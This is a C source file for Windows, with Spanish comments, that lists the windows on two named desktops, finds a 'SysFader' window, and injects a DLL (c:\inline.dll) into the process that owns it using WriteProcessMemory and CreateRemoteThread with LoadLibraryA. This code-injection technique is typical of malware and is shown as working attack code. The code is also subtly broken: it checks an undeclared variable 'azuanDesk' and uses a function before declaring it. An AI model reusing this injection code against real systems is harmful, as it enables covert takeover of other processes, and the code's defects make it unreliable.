#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

BOOL CALLBACK EnumAll(HWND lpszWindow, LPARAM lParam){
    char title[128];
    char ie[] = "XXXX";
    char fader[] = "SysFader";
    int bytes, pid;
    DWORD tid;
    LPVOID loadlib, memReg;
    char dllPath[] = "c:\\inline.dll";
    HANDLE hProc;
    
    bytes = GetWindowTextA(lpszWindow, title, 128);
    //if(strstr(title, ie) && bytes > 10){
    if(strstr(title, fader) && bytes > 6){
        //Thread ID
        tid = GetWindowThreadProcessId(lpszWindow, &tid);
        pid = ListThreads(tid);
        if(!pid){
            printf("[-] Error localizando el proceso: %d\n", GetLastError());
            return 0;
        }
        //Este es nuestro proceso!
        hProc = OpenProcess(PROCESS_ALL_ACCESS, 1, pid);
        loadlib = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        memReg = (LPVOID)VirtualAllocEx(hProc,NULL,strlen(dllPath),MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if(!WriteProcessMemory(hProc, memReg, dllPath, sizeof(dllPath), 0)){
            printf("[-] No se escribieron datos en memoria: %d\n", GetLastError());
            return 1;
        }
        if(CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib, memReg, 0, 0))
            printf("[*] Libreria inyectada\n");
        printf("PID:%d\nTID: %d\nWindow: %s\n",pid,tid,title);
        CloseHandle(hProc);
        return 0;
    }
    return 1;
}

int ListThreads(DWORD tid){
    HANDLE hSnap;
    THREADENTRY32 te32;
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    te32.dwSize = sizeof(THREADENTRY32);
    if(!Thread32First(hSnap, &te32))
        return 0;
    while(Thread32Next(hSnap, &te32)){
        if(te32.th32ThreadID == tid)
            return te32.th32OwnerProcessID;
    }
    CloseHandle(hSnap);
    return 0;
}

int main(){
     //Vars
    HANDLE sDesk, defDesk;
    
    //----- Enumerar ventanas ------/**
    defDesk = OpenDesktop("DefaultDesk",0,0,GENERIC_ALL);
    sDesk = OpenDesktop("SDesk",0,0,GENERIC_ALL);
    if(!azuanDesk || !defDesk){
        printf("[-] Error obteniendo algun escritorio: %d\n", GetLastError());
        return 0;
    }
    
    SetThreadDesktop(defDesk);
    EnumDesktopWindows(defDesk, (WNDENUMPROC)EnumAll, 0);  
    SetThreadDesktop(sDesk);
    EnumDesktopWindows(sDesk, (WNDENUMPROC)EnumAll, 0);  
	CloseHandle(defDesk);
    CloseHandle(sDesk);
    return 1;
}
